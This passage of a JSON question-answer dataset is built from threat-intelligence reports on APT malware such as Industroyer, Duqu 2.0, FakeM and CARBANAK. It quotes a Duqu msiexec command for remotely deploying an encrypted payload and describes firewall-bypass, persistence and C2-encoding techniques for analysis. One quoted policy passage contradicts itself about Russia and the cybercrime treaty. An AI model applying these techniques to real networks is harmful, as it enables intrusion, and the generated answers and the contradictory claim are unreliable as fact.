6ee35da59f92f71e757d4d5b964ecf00\nAfter each command is processed, BACKSPACE sends a status message to the C2 server; messages starting with \"O\" indicate success, messages starting with \"E\" indicate failure.\nMedium Headline: Configuration and C2 Encoding\nWhile earlier versions of BACKSPACE may contain the C2 domains and other variables in plain text within the binary, they are encoded within this (and other more recent) variants. Decoding is done in two ways: by adding an incremental counter, or by XORing and bitwise shifting bytes.\nIn addition, binary (non-string) data transferred between the victim host and the second stage C2 server is encoded/decoded by adding an incremental counter and XORing with 0x23, as shown below.\nMedium Headline: Host-Based Firewall Bypass\nThis variant of BACKSPACE includes functionality to attempt to bypass a number of personal firewall applications. BACKSPACE iterates through open windows and matches the type (Button) and its associated Window Text against a set of strings stored within the malware. If a match is found, BACKSPACE sends a message to simulate a mouse click, attempting to \"approve\" firewall rules to allow the malware to execute. Both English and Chinese strings are stored, implying that the malware attempts to target versions of the products below that are localized for those languages.37\nTable 12: Strings used in attempt to bypass host-based firewalls\nQ: Describe the encoding methods used by BACKSPACE for its configuration and C2 communications. How does the malware handle binary data transfer between the victim host and the second stage C2 server?",
    "output": "BACKSPACE encodes its C2 domains and other variables within the binary using two methods: by adding an incremental counter or by XORing and bitwise shifting bytes. For binary (non-string) data transferred between the victim host and the second stage C2 server, the encoding/decoding process involves adding an incremental counter and XORing with 0x23. This ensures that the communication is obfuscated and harder to detect or intercept by traditional security measures.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What is the significance of the MPKBot IRC bot in relation to the Magic Hound campaign, and how is it related to the Rocket Kitten adversary group?",
    "output": "The MPKBot IRC bot is significant because it was found using the same IP for its C2 server as a Leash sample, indicating a possible link between the two. This MPK IRC bot is very similar to the MPK Trojan associated with the Rocket Kitten adversary group. Both versions of the MPK Trojan share considerable similarities in behavior and direct code overlap, suggesting that they are based on the same code base. This relationship highlights the potential connection between the Magic Hound campaign and the Rocket Kitten adversary group.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: ON DECEMBER 18, 2016 THE SECOND POWER OUTAGE OCCURRED IN UKRAINE CAUSING SOME BLACKOUTS IN KIEV FOR LESS THAN ONE HOUR. THIS WAS THE TIME NEEDED FOR AN EXPERT TEAM TO GO ONSITE AND FIX THE PROBLEM USING A MANUAL PROCEDURE.\nThis second attack was targeting another grid company named Ukrenergo. This incident caused multiple blackouts in the Ukrainian capital - Kiev and a complete power loss for the northern part of Kiev on the right bank of the Dnieper river and the surrounding region.\nExperts of the grid company were able to fix the situation in less than 1 hour with a manual procedure. This emergency response team was on site 30 minutes after the outage.\nThe faulty component was the automation control systems piloting a substation in a village near the Kiev city. Automation systems in such substations control how power coming from power plants at high voltage is transformed to lower voltage for consumer and industrial use.\nThe main website of the power grid had been unreachable for a couple of days during and after the attack. The head of Ukrenergo had to publish a quick statement on Facebook (provided in the appendix).\nWhen the situation had been recovered, the company published an official statement available on their website.\nIt states \"Among the possible causes of failure are considered hacking and equipment malfunction (crashes). Timely police were involved and conducted a thorough investigation into the accident, which will be to inform the public. By the end of the official investigation into the case management of all objects SE 'NEC' Ukrenergo with automatic control system was transferred to the local level.\"\nIn the middle of January Ukrenergo confirmed that the source cause of this power outage was malicious. The authors are still undetermined.\nBased on an article from Reuters, Ukrenergo said in comments emailed to Reuters: \"Preliminary findings indicate that workstations and Supervisory Control and Data Acquisition (SCADA) systems, linked to the 330 kilowatt sub-station \"North\", were influenced by external sources outside normal parameters. [...] The analysis of the impact of symptoms on the initial data of these systems indicates a premeditated and multilevel invasion\"\nLaw enforcement officials and cyber experts are still working to compile a chronology of events, draw up a list of compromised\naccounts, and determine the penetration point while tracing computers potentially infected with malware in sleep mode.\nSo far, no huge technical details related to the attack have been released publically. Indeed Marina Krotofil from Honeywell and Oleskii Yasinskiy from ISSP shared some information confirming the attack without going further concerning technical details related to this attack.\nAccording to CyberX, a targeted malware campaign called BugDrop could have been performed in the reconnaissance phase. Indeed, the goal was to retrieve a maximum amount of information regarding the final target which was the power grid. The complexity of the malware was quite impressive. Once the target was infected through a targeted phishing campaign and the malware deployed, it retrieved a lot of information from the network and also screenshots, documents, passwords and audio recordings using the microphone. For each infected target, the data was encrypted with Blowfish using a \"user-ID\". The exfiltration was performed through Dropbox services. The assumption linking this malware and the attack is detailed in the claims section below.\nBig Headline: THE 12TH OF JUNE 2017, RESEARCHER ANTON CHEREPANOV FROM ESET PUBLISHED A COMPREHENSIVE TECHNICAL REPORT REGARDING THE MALWARE CALLED INDUSTROYER. DRAGOS HAS ALSO PROVIDED AN IN-DEPTH ANALYSIS UNDER THE NAME OF CRASHOVERRIDE.\nTHIS MALWARE IS PROBABLY LINKED TO THE DECEMBER 2016 UKRAINE ATTACK. INDEED,THIS MALWARE HAS BEEN DESIGNED TO DISRUPT THE WORKING PROCESS OF INDUSTRIAL CONTROL SYSTEMS\nUSED IN ELECTRICAL SUBSTATIONS.\nINDUSTROYER / CRASHOVERRIDE is the first OT malware designed specifically to attack electric grids.\nThis malware supports four differents industrial protocols:\nIEC 60870-5-101 (aka IEC 101)\nIEC 60870-5-104 (aka IEC 104)\nIEC 61850\nIt is obvious that since the first 2015 attack (using Blackenergy and Killdisk) and this malware, there is a huge gap and attackers have improved their capacities. The malware is now able to control switches and breakers. ESET have seen indications that this malware could have been the tool used by attackers to cause the power outage in December 2016. The infection vector remains unknown but the investigation is still ongoing.\nOLE for Process Control Data Access (OPC DA)\nBefore going deeper into the malware, let's have a look at embedded components. As we can see in the schematic below, the malware embeds:\nTwo backdoors (C&C through HTTPS)\nA launcher\nA wiper\nFour differents payloads corresponding to four different industrial protocols\nRegarding the C&C it is interesting to note that a local proxy configuration has been hardcoded in the malware. The local proxy is the way to access the Internet from the local network. This configuration is adapted to the local network. The fact that the local proxy has been hardcoded in the malware, means having technical knowledge about the target. Due to this, we can conclude that it was a targeted attack. In addition, without proper modification of the malware, it cannot be used on another target.\nAnother interesting thing is the way the malware deploys the backdoor to the victim to be able to spawn a shell, download a file and execute a program. At the beginning, when the backdoor is executed on the victim, it stays in\nRAM and starts communicating with the C&C. At this moment, through the C&C, information related to the victim is exfiltrated and analyzed to find vulnerabilities on the targeted system. Once found, the exploit is sent through the backdoor (still in ram) to perform a privilege escalation. And now the fun part begins:\nAn initial persistent backdoor (the main) is deployed to replace a non-critical Windows service.\nA second persistent backdoor (the backup) is installed through a malicious Microsoft Notepad on the victim. Each time the Notepad is used the backdoor is also executed.\nBig Headline: IEC 101 PAYLOAD COMPONENT\nThe payload uses the IEC101 protocol (IEC 60870-5-101) which is used for communications between industrial control systems and remote terminal units. If the target machine communicates with a RTU using IEC101, the IEC101 payload is used. It parses a configuration file created by the hacker to determine the process's target, it kills it and opens COM ports to communicate with the RTU and also to prevent the original process from communicating with the RTU. Once the communication has been established, the malware sends IEC101 C_SC_ NA_1 and C_DC_NA_1 packets to switch off the RTU at the specified Information Object Address (IOA).\nMedium Headline: IEC 61850 PAYLOAD COMPONENT\nThis payload uses the IEC 61850 standard. This standard describes a protocol used for multi-vendor communication among devices that perform protection, automation, metering, monitoring, and control of electrical substation automation systems. The 61850 payload uses only a small subset of the protocol to produce its disruptive effect. The payload looks for a configuration file defining targets and commands as seen previously. If the payload does not find the file, it starts to scan the network for TCP port 102 (used by IEC 61850). Once found, the payload sends a connection request packet using the COTP protocol. If successful, it sends a InitiateRequest and a getNameList request to compile a list of targets, variables and contents. Afterwards, the payload parses received data for variables that contain the strings CSW (corresponds to logical nodes used to control circuit breakers and switches). For each of them it will try a read and a write order to change the position of the breaker.\nBig Headline: IEC 104 PAYLOAD COMPONENT\nThis payload uses the IEC104 protocol (IEC 60870-5-104) which is used to send IEC101 on a TCP/IP network.Similar to the IEC101 payload, the DLL reads a configuration file containing information regarding the target including the IP address, the port, the ADSU (Application Service Data Unit) and the operation. The goal of this payload is to connect to a specified IP address and send packets with the ASDU address to interact with the IOA to switch it off. The OT impact is quite important. By using this payload, the malware is able to communicate on the OT network using the IEC104 protocol and to send orders to breakers. At the same time, the malware is also able to communicate on the IT network to receive orders from the C&C servers located outside of the target.\n\nQuestion: How did the Industroyer/CrashOverride malware establish persistence on the victim's system and what was the significance of the hardcoded local proxy configuration?\n\nAnswer:",
    "output": "The Industroyer/CrashOverride malware established persistence by deploying two backdoors: an initial persistent backdoor that replaced a non-critical Windows service and a backup backdoor installed through a malicious Microsoft Notepad. The significance of the hardcoded local proxy configuration was that it indicated a targeted attack, as the malware required specific technical knowledge about the target's network. Without proper modification, the malware could not be used on another target.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: LATERAL MOVEMENT\nIn general, once the attackers gain access into a network, two phases follow:\n\u2022 Reconnaissance and identification of network topology\n\u2022 Lateral movement\nIn the case of Duqu 2.0, the lateral movement technique appears to have taken advantage of another zero-day, (CVE-2014-6324) which was patched in November 2014 with 5MS14-068 . This exploit allows an unprivileged domain user to elevate credentials to a domain administrator account. Although we couldn't retrieve a copy of this exploit, the logged events match the Microsoft detection guidance for this attack. Malicious modules were also observed performing a \"pass the hash\" attack inside the local network, effectively giving the attackers many different ways to do lateral movement.\nOnce the attackers gained domain administrator privileges, they can use these permissions to infect other computers in the domain.\nTo infect other computers in the domain, the attackers use few different strategies. In most of the attacks we monitored, they prepare Microsoft Windows Installer Packages (MSI) and then deploy them remotely to other machines. To launch them, the attackers create a service on the target machine with the following command line:\nmsiexec.exe /i \"C:\\\\[\u2026]\\tmp8585e3d6.tmp\" /q PROP=9c3c7076-d79f-4c\n4\n5\nThe PROP value above is set to a random 56-bit encryption key that is required to decrypt the main payload from the package. Other known names for this parameter observed in the attacks are \"HASHVA\" and \"CKEY\". The folder where the package is deployed can be different from case to case, depending on what the attackers can access on the remote machine.\nIn addition to creating services to infect other computers in the LAN, attackers can also use the Task Scheduler to start \"msiexec.exe\" remotely. The usage of Task Scheduler during Duqu infections for lateral movement was also observed with the 2011 version and was described by  6Symantec in their technical analysis.\n\"msiexec.exe\" - Task Scheduler trace in the logs\nThe MSI files used in the attacks contain a malicious stub inside which serves as a loader. The stub loads the other malware resources right from the MSI file and decrypts them, before passing execution to the decrypted code in memory.\nMalicious stub with query to load the other resources from the MSI file highlighted.\nThe encryption algorithms used for these packages differ from case to case. It's important to point out that the attackers were careful enough to implement unique methods, encryption algorithms and names (such as file names) for each attack, as a method to escape detection from security products and limit the ability of an antivirus company to find other infections once one of them has been identified.\nSo far, we've seen the following encryption algorithms used by the attackers:\n\u2022 Camellia\n\u2022 AES\n\u2022 XTEA\n\u2022 RC4\n\u2022 Different multibyte XOR-based encryption\n6\nFor compression algorithms, we've seen the following:\n\u2022 LZJB\n\u2022 LZF\n\u2022 FastLZ\n\u2022 LZO\nIn essence, each compiled attack platform uses a unique combination of algorithms that make it very difficult to detect.\nThe attackers can deploy two types of packages to their victims:\n\u2022 \"Basic\", in-memory remote backdoor (~500K)\n\u2022 Fully featured, C&C-capable, in-memory espionage platform (18MB)\nThese have similar structures and look like the following:\nMalicious Duqu 2.0 MSI package.\nIn the screenshot above, one can see the loader (ActionDll: 17,920 bytes) and the main payload (ActionData0: 476,736 bytes). Upon execution, ActionDll is loaded and control is passed to its only export, StartAction.\nThe \"basic\" in-memory remote backdoor is pushed to computers inside the domain by the Domain Controller on a regular basis \u2013 almost like a worm infection. This gives the attackers an entry into most of the machines from the domain and if further access is needed, they can upload a more sophisticated MSI file that deploys tens of different plugins to harvest information.\nA thorough description of the malware loading mechanism from the \"basic\" remove backdoor MSI can be found below.\nMedium Headline: File properties\nThe MSI file has the following general properties:\n\u2022 Composite Document File V2 Document\n\u2022 Little Endian\n\u2022 OS: Windows, Version 6.1\n\u2022 Code page: 1252\n\u2022 Title: {7080A304-67F9-4363-BBEB-4CD7DB43E19D} (randomly generated GUIDs)\n\u2022 Subject: {7080A304-67F9-4363-BBEB-4CD7DB43E19D}\n\u2022 Author: {7080A304-67F9-4363-BBEB-4CD7DB43E19D}\n\u2022 Keywords: {7080A304-67F9-4363-BBEB-4CD7DB43E19D}\n\u2022 Comments: {7080A304-67F9-4363-BBEB-4CD7DB43E19D}\n\u2022 Template: Intel;1033\n\u2022 Last Saved By: {7080A304-67F9-4363-BBEB-4CD7DB43E19D}\n\u2022 Revision Number: {4ADA4205-2E5B-45B8-AAC2-D11CFD1B7266}\n\u2022 Number of Pages: 100\n\u2022 Number of Words: 8\n\u2022 Name of Creating Application: Windows Installer XML (3.0.5419.0)\n\u2022 Security: 4\nIt should be noted that MSI files used in other attacks can have different other properties. For example, we observed several other fields:\n\u2022 Vendor: Microsoft or InstallShield\n\u2022 Version: 1.0.0.0 or 1.1.2.0 or 2.0.0.0\nSome of these are visible via the Windows Explorer file properties dialog box:\nThere are two binary blocks inside this MSI package:\nThe first binary, called ActionDll, is in fact a Windows PE DLL file, while the other one is a Camellia-encrypted and LZJB-compressed data payload (the encryption and compression algorithm vary from case to case). In fact, there are several layers of executable code embedded one into another as compressed or encrypted binary blocks. Here's a look at a Duqu 2.0 MSI package, with all its internal payloads:\nWe describe these components in more detail below.\nMedium Headline: First Layer: ActionDLL (msi.dll)\nOriginal filename: msi.dll\nMD5: e8eaec1f021a564b82b824af1dbe6c4d\nSize: 17'920 bytes\nLink time: 2004.02.12 02:04:50 (GMT)\nType: 64-bit PE32+ executable DLL for MS Windows\nThis DLL has only one export name called StartAction, which is called in the context of msiexec.exe process. When this function is called, it retrieves an MSI property called PROP and uses it as a decryption key for the bundled ActionData0 package:\nNext, the code iterates over 12 possible payloads that have to be decrypted and started. The payloads are part of the MSI and may have the following names: ActionData0, ActionData1, ActionData2, etc.\nThe package described here contains only one payload named \"ActionData0\".\nMedium Headline: Second Layer: ActionData0\nThis binary chunk contains the main code, in compressed and encrypted format. It represents a composition of executable, position-independent code blocks mixed with embedded data objects. The code seems to be based on a framework and heavily uses helper structures that contain pointers to a set of system APIs and offsets to internal data blocks. Such structures are definitely a trademark of the developer. When they are initialized, one field (usually the first 4 bytes) contains a magic value that identifies the state and type of the structure.\nAnother trademark of the coder is the way to import system API by module and export name hashes. The hashing algorithm was found all over this and other layers of executable code. It's easily recognizable by two DWORD constants: 0x8A20C27 and 0x67F84FC6.\nBasically, the code in ActionData0 passes execution to an embedded executable, which we will refer by its internal name: \"klif.dll\". The execution is passed to the second exported function in table of exports of this DLL file. This disregards the export name and relies only on the order of functions in the table of PE export ordinals. When this export function is called, a next stage helper structure pointer is passed to it, so that it can use some of the values set on the upper layer.\nHowever, before passing execution to klif.dll, the code attempts alternative routes. First, it attempts to find the name of the following format \"api-ms-win-shell-XXXX. dll\", where \"X\" can be any decimal number. The name is valid if there is no module with such filename loaded into current process. The code attempts to iteratively find such name starting from api-ms-win-shell-0000.dll, api-ms-win-shell-0001.dll, api-ms-win-shell-0002.dll and so on. This may be a dependency to the Duqu platform component that is yet to be discovered.\nRight after this, if the name was found, the code attempts to map a section kernel object by name, which is generated using a PRNG-based algorithm. The name of the section has the following template: \"\\BaseNamedObjects\\{XXXXXXXX-XXXX-XXXX-XXXXXXXXXXXX}\", where \"X\" is any hexadecimal digit that is generated based on current system boot time. So far, the name of the section is \"machine/boot time\" dependent, which makes it unique but allows other processes of modules to locate such section if they use the same name generation algorithm. This section is accessed in different other parts of the code and modules. Lets refer to this section as OSBoot-section from now. Once the section name is generated the code tries to open such section and, if it is found, it takes some values from it and attempts to open a specific device and issue a number of IOCTL codes to the driver. The name of the driver device as well as IOCTL codes are located inside a section of the kernel mode driver KMART.dll that is described below.\nThe code developer has a preference for using sections to any other ways to access data. Another use of sections appears to be in mapping the part of code/data where klif.dll is embedded and then finding that section using a hardcoded magic QWORD number: 0xA1B5F8FC0C2E1064. Once the section is found in address space of current process the code attempts to pass execution to it.  This alternative execution route is not applicable to current MSI file package but simply exists in the code probably due to common code template used for building current MSI package. It may also be an indicator of another Duqu platform component that wasn't used in the attacks that we observed.\n\nAnswer this question based on the above context: How did the Duqu 2.0 attackers ensure that their malware remained undetected and difficult to analyze? Discuss the methods they employed.",
    "output": "The Duqu 2.0 attackers ensured their malware remained undetected by implementing unique methods, encryption algorithms, and names for each attack. They used various encryption algorithms like Camellia, AES, XTEA, RC4, and different multibyte XOR-based encryption, along with compression algorithms such as LZJB, LZF, FastLZ, and LZO. Each compiled attack platform used a unique combination of these algorithms, making it very difficult to detect. Additionally, the attackers were careful to use different file names and properties for each attack, limiting the ability of antivirus companies to find other infections once one was identified.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "CHAR username[128];\nCHAR computername[128];\nDWORD static_value_70000h;\nDWORD os_codepage;\nDWORD campaign_code_1;\nDWORD campaign_code_2;\n};\nThe Trojan will encrypt this data using the key provided by the C2 and send it to the server. The Trojan will then wait for the C2 to respond, which it will decrypt and parse for FakeM commands. Unit 42 has been unable extract any plug\u00adins from C2 network traffic; however, several FakeM custom SSL samples contain embedded plug\u00adins that run without interaction with the C2 server. Also, Unit 42 was able to extract several modules from the original FakeM server application, as seen in Table 3. All of these modules are shellcode\u00adbased plug\u00adins that would work with the custom SSL variant of FakeM with little to no modification.\nRelated to FakeM Original: CallMe\nCallMe is a Trojan designed to run on the Apple OSX operating system. This Trojan was delivered in targeted attacks on Uyghur activists in 2013 and used infrastructure associated with FakeM.\nIn February 2013, on the CallMe Trojan and found that it is based on a tool called Tiny SHell, an OSX shell tool whose source code is available on the Internet. The Trojan uses AES to encrypt the communication channel its C2 server, which will provide one of three commands to carry out activities on the compromised system, as seen in Table 4.\nCommandDescription2Put a file on the system from the C2 server. File is saved to a specified filename in <HOME directory>/downloads/.3Create a reverse shell to interact with the compromised system.\nTable 4: Commands Available in the CallMe OSX Malware\nThe infrastructure overlap between FakeM and CallMe involves the fully qualified domain name (FDQN) of \"googmail.org\", which was used by both FakeM and CallMe samples. This suggests that not only do these threat actors have the ability to compromise victims running the Microsoft Windows operating system, but they can also target individuals running Apple's OSX as well.\nRelated to FakeM Custom SSL: Psylo\nDuring infrastructure analysis of FakeM Custom SSL variants, Unit 42 found infrastructure overlaps between FakeM and another new, previously unreported Trojan that we named \"Psylo\". Psylo is a tool that allows threat actors to upload and download files to and from a compromised system, as well as execute commands and applications on the system. The name Psylo is an anagram from the mutex created when initially running this payload, which is 'hnxlopsyxt'.\nPsylo is similar to FakeM in that they are both shellcode\u00adbased, and they have similar configurations and C2 communication channels. As you can see from the following two configuration structures, Psylo and FakeM have similar configurations with only the array length of the C2 locations being different.\nstruct psylo_c2_config {char[60] c2_host_1;char[60] c2_host_2;char[60] c2_host_3;DWORD c2_port_1;DWORD c2_port_2;DWORD c2_port_3;};struct fakem_customssl_c2_config {char[64] c2_host_1;char[64] c2_host_2;char[64] c2_host_3;DWORD c2_port_1;DWORD c2_port_2;DWORD c2_port_3;};\nFigure 15: Comparison between Psylo and FakeM custom SSL configurations\nBoth use SSL to communicate with their C2 servers, and it appears they share common code to carry out the Diffie Hellman key exchange. We compared the Diffie Hellman code from Psylo with FakeM custom SSL variant and found that they were very similar, but the FakeM samples had some of the functionality within sub\u00adfunctions, which rendered binary diffing between the two Trojans impossible.\nAnother slight difference involves how Psylo and FakeM generate random numbers for SSL. FakeM uses QueryPerformanceCounter to create a random number, whereas Psylo uses CryptGenRandom, both of which generate random numbers 68 bytes long. Interesting enough is that CryptGenRandom calls RtlGenRandom, which uses QueryPerformanceCounter along with other system attributes to generate a random number.\nWhen communicating with its C2 server, Psylo will use HTTPS with a unique user\u00adagent of (notice the lack of a space between \"5.0\" and \"(Windows\"):\n\nAnswer this question based on the above context: How does the FakeM Trojan, used by Scarlet Mimic, handle encryption and communication with its Command and Control (C2) server? Why is this method significant in terms of evading detection?",
    "output": "The FakeM Trojan encrypts specific data, such as the username, computer name, OS codepage, and campaign codes, using a key provided by the C2 server before sending it. It then waits for the C2 server to respond, decrypts the response, and parses it for FakeM commands. This method is significant because it ensures secure communication between the Trojan and the C2 server, making it harder for network defenders to intercept and analyze the traffic. Additionally, the use of encryption helps the Trojan evade detection by traditional security measures that rely on plaintext analysis.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Welcome to the latest issue of the ESET APT Activity Report!\nThis report summarizes the activities of selected advanced persistent threat (APT) groups that were observed, investigated, and analyzed by ESET researchers from April 2023 until the end of September 2023. In the monitored timespan, we observed a notable strategy of APT groups utilizing the exploitation of known vulnerabilities to exfiltrate data from governmental entities or related organizations. Russia-aligned Sednit and Sandworm, North Korea-aligned Konni, and geographically unattributed Winter Vivern and Sturgeon Phisher seized the opportunity to exploit vulnerabilities in WinRAR (Sednit, SturgeonPhisher, and Konni), Roundcube (Sednit and Winter Vivern), Zimbra (Winter Vivern), and Outlook for Windows (Sednit) to target various governmental organizations in Ukraine, Europe, and Central Asia. Regarding China-aligned threat actors, GALLIUM probably exploited weaknesses in Microsoft Exchange servers or IIS servers, extending its targeting from telecommunications operators to government organizations around the world; MirrorFace probably exploited vulnerabilities in the Proself online storage service; and TA410 probably exploited flaws in the Adobe ColdFusion application server.\nIran- and Middle East-aligned groups continued to operate at high volume, primarily focusing on espionage and data theft from organizations in Israel. Notably, Iran-aligned MuddyWater also targeted\nan unidentified entity in Saudi Arabia, deploying a payload that suggests the possibility of this threat actor serving as an access development team for a more advanced group.\nThe prime target of Russia-aligned groups remained Ukraine, where we discovered new versions of the known wipers RoarBat and NikoWiper, and a new wiper we named SharpNikoWiper, all deployed by Sandworm. Interestingly, while other groups \u2013 such as Gamaredon, GREF, and SturgeonPhisher \u2013 target Telegram users to try to exfiltrate information or at least some Telegram-related metadata, Sandworm uses this service for active measure purposes, advertising its cyber-sabotage operations. However, Gamaredon remained the most active group in Ukraine, significantly enhancing its data-collecting capabilities by redeveloping existing tools and deploying new ones.\nNorth Korea-aligned groups continued to focus on Japan, South Korea, and South Korea-focused entities, employing carefully crafted spearphishing emails. The most active Lazarus scheme observed was Operation DreamJob, luring targets with fake job offers for lucrative positions. This group consistently demonstrated its capability to create malware for all major desktop platforms. Finally, our researchers uncovered the operations of three previously unidentified China-aligned\ngroups: DigitalRecyclers, repeatedly compromising a governmental organization in the EU; TheWizards, conducting adversary-in-the-middle attacks; and PerplexedGoblin, targeting another government organization in the EU.\nESET APT Activity Reports contain only a fraction of the cybersecurity intelligence data provided to customers of ESET's private APT reports. ESET researchers prepare in-depth technical reports and frequent activity summaries detailing activities of specific APT groups, in the form of ESET APT Reports PREMIUM, to help organizations tasked with protecting citizens, critical national infrastructure, and high-value assets from criminal and nation-state-directed cyberattacks. Comprehensive descriptions of activities described in this document were therefore previously provided exclusively to our premium customers. More information about ESET APT Reports PREMIUM and its delivery of high-quality, strategic, actionable, and tactical cybersecurity threat intelligence is available at the .\nESET products protect our customers' systems from the malicious activities described in this report. Intelligence shared here is based mostly on proprietary ESET telemetry data and has been verified by ESET researchers.\nQuestion: How did the APT groups Sednit, Sandworm, Konni, Winter Vivern, and SturgeonPhisher leverage known vulnerabilities to target governmental organizations, and what were the specific software applications they exploited?",
    "output": "Answer: The APT groups Sednit, Sandworm, Konni, Winter Vivern, and SturgeonPhisher utilized known vulnerabilities in various software applications to target governmental organizations. Specifically, Sednit, SturgeonPhisher, and Konni exploited vulnerabilities in WinRAR. Additionally, Sednit and Winter Vivern targeted Roundcube, while Winter Vivern also exploited Zimbra. Sednit further extended its reach by exploiting Outlook for Windows. These vulnerabilities allowed the groups to exfiltrate data from governmental entities or related organizations in Ukraine, Europe, and Central Asia.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the TA402 APT group use Masquerading techniques to evade detection and deliver the NimbleMamba malware?",
    "output": "Masquerading is a technique used by adversaries to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. In the case of the TA402 APT group, they employed Masquerading techniques to deliver the NimbleMamba malware. Specifically, they used actor-controlled domains and Gmail accounts to masquerade as legitimate entities, such as the Quora website. They also used Dropbox URLs to deliver the malicious RAR files, which allowed them to blend in with legitimate email traffic. Furthermore, the malware itself used guardrails to ensure that it only executed on targeted machines, and it used the Dropbox API for command and control communication, making it harder to detect. Additionally, the malware was obfuscated using third-party obfuscators, such as SmartAssembly, to make it more difficult to analyze. The use of these Masquerading techniques demonstrates the TA402 group's determination to evade detection and deliver their malware to their targets.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Was There a Build Tool?\nLet's first take a look at our deduction about a build tool for CARBANAK:\n\"A build tool is likely being used by these attackers that allows the operator to configure details such as C2 addresses, C2 encryption keys, and a campaign code. This build tool encrypts the binary's strings with a fresh key for each build.\"\nWe came to this deduction from the following evidence:\n\"Most of CARBANAK's strings are encrypted in order to make analysis more difficult. We have observed that the key and the cipher texts for all the encrypted strings are changed for each sample that we have encountered, even amongst samples with the same compile time. The RC2\nkey used for the HTTP protocol has also been observed to change among samples with the same compile time. These observations paired with the use of campaign codes that must be configured denote the likely existence of a build tool.\"\nFigure 1 shows three keys used to decode the strings in CARBANAK, each pulled from a different CARBANAK sample.\nIt turns out we were spot-on with this deduction. A build tool was discovered in the CARBANAK source dump, pictured with English translations in Figure 2.\nWith this build tool, you specify a set of configuration options along with a template CARBANAK binary, and it bakes the configuration data into the binary to produce the final build for distribution. The Prefix text field allows the operator to specify a campaign code. The Admin host text fields are for specifying C2 addresses, and the Admin password text field is the secret used to derive the RC2 key for encrypting communication over CARBANAK's pseudo-HTTP protocol. This covers part of our deduction: we now know for a fact that a build tool exists and is used to configure the campaign code and RC2 key for the build, amongst other items. But what about the encoded strings? Since this would be something that happens seamlessly behind the scenes, it makes sense that no evidence of it would be found in the GUI of the build tool. To learn more, we had to go to the source code for both the backdoor and the build tool.\nFigure 3 shows a identifier named ON_CODE_STRING defined in the CARBANAK backdoor source code that when enabled, defines macros that wrap all strings the programmer wishes to encode in the binary. These functions sandwich the strings to be encoded with the strings \"BS\" and \"ES\". Figure 4 shows a small snippet of code from the header file of the build tool source code defining BEG_ENCODE_STRING as \"BS\" and END_ENCODE_STRING as \"ES\". The build tool searches the template binary for these \"BS\" and \"ES\" markers, extracts the strings between them, encodes them with a randomly generated key, and replaces the strings in the binary with the encoded strings. We came\nacross an executable named bot.dll that happened to be one of the template binaries to be used by the build tool. Running strings on this binary revealed that most meaningful strings that were specific to the workings of the CARBANAK backdoor were, in fact, sandwiched between \"BS\" and \"ES\", as shown in Figure 5.\n\nBased on the above text, answer a question. What role do the 'BS' and 'ES' markers play in the CARBANAK backdoor source code, and how does the build tool utilize these markers to encode strings within the binary?",
    "output": "In the CARBANAK backdoor source code, the 'BS' and 'ES' markers are used to identify strings that need to be encoded. When the ON_CODE_STRING identifier is enabled, it defines macros that wrap all strings the programmer wishes to encode in the binary with 'BS' and 'ES'. The build tool then searches the template binary for these markers, extracts the strings between them, encodes them with a randomly generated key, and replaces the original strings in the binary with the encoded strings. This process ensures that the meaningful strings related to the backdoor's functionality are obfuscated, making analysis more difficult.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: 6.1. Convention on Cybercrime\nThe Council of Europe has established a treaty on cyber crime that entered into force in 2004. Twenty-two Council of Europe member nations, along with the United States, have ratified the treaty agreeing to international cooperation concerning cybercrime issues. The Russian Federation has not agreed to the treaty making it difficult for states to resolve issues with Russia concerning cyber crimes in an international forum (Council of Europe, undated a). This treaty is still significant because it is the first international treaty on crimes committed on the internet (Council of Europe, undated b).\nThe main goal of the convention, as stated in the preamble, is to protect nations against cybercrime, by adopting laws and regulations, and fostering co-operation internationally. The states that become a party to the Convention on Cybercrime agree to adopt laws that create criminal penalties for committing crimes on the internet. The convention outlines several areas that states have agreed to make criminal statutes on issues such as illegal access of computer systems, system and data interference, and other computer related fraud. Nations that are party to the convention also agree to cooperate with investigations, to provide mutual assistance concerning cyber crimes, and to pursue the collection of evidence. The extradition of alleged cybercriminals is also agreed to by parties to the treaty. Disagreements between states that have ratified the treaty include direct negotiations, settlement in front of the European Committee on Crime Problems (CDPC), a tribunal for arbitration or adjudication in front\nof the International Court of Justice. The Convention on Cybercrime gave a framework for cooperation among member states for the prosecution of cyber criminals by removing safe havens for the cyber criminals. (Council of Europe, 2001)\nHowever, Russia does agree to the convention and it protects citizens who engage in cyber misconduct by preventing their extradition out of Russia. Failing to sign the convention agreement also prevents Russia from having any legal standing to prosecute trans-national cyber criminals who attack Russia's IT infrastructure.\nMedium Headline: 6.2. Organization for Security and Co-operation in Europe\nThe Organization for Security and Co-operation in Europe (OSCE) has a tradition of promoting the security and stability of Europe. This tradition of promoting security and stability since 2004 has included cyber security. The OSCE's initial focus on cyber security concerned the use of the internet for recruiting, fundraising, and communication by terrorist organizations. In 2006 the OSCE's efforts began to focus on protecting vital information infrastructures against cyber attacks. Debate in the OSCE has not led to great change but has been a forum for further cooperation in cyber security in Europe. In June 2008, the Estonian Defence Minister, Jaak Aaviksoo, in an address to members of the OSCE, said there is \"an immense amount of work to be done [concerning cyber security].\" Minister Aaviksoo used the forum of the OSCE to use his nation's experience in defending against cyber crime to increase international cooperation in Europe. This statement by the Estonian Defence Minister sums up OSCE's efforts concerning cyber defence, they are still in the talking phase and have at least recognized the importance of cyber defence (Cornish, 2009:20-21). The OSCE will continue to be a forum to publicize grievances for European nations that have had their IT infrastructures attacked by Russian hackers. European nations will judge Russia on its cooperation with the OSCE in finding and prosecuting individuals who engage in cyber attacks.\nMedium Headline: 6.3. The European Union\nEstonia continues to lobby for improved international cooperation in cyber security as it calls on the European Union (EU) to pass legislation concerning crimes committed on the internet. While addressing the\nEuropean Parliament, Toomas Hendrik, the Estonian President, called upon the EU to pass legislation that make cyber attacks against public and private web sites a criminal act 